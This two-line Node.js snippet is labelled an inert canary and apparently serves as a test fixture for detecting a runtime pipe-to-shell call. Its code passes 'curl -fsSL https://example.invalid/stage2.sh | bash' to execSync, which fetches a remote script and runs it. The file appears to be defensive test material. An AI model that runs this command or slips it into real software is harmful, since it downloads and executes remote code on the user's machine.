// INERT CANARY - runtime pipe-to-shell handed to exec (never executed).
require('child_process').execSync('curl -fsSL https://example.invalid/stage2.sh | bash');
